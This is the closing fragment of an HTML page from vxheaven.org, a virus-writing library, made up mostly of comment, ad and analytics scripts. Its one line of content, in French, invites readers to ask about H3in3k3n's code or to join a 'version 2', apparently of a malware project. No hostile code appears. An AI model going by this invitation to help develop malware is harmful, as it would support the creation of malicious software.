+<p>Pour ceux qui veulent des explications sur le code de H3in3k3n ou participé à la version 2, vous pouvez m'écrire à <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="395c54495c4b094b795414575c4d17584b5b564b575c4d17564b5e17">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></p>
+[<a style="" href="/lib/?lang=FR&amp;index=MA#vem01">Back to index</a>] [<a href="/lib/vem01.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vem01">de</a><a href="/lib/index.php?lang=en&amp;id=vem01">en</a><a href="/lib/index.php?lang=es&amp;id=vem01">es</a><a href="/lib/index.php?lang=it&amp;id=vem01">it</a><a href="/lib/index.php?lang=fr&amp;id=vem01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vem01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vem01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vem01">ua</a></div>
+</body>
+</html>
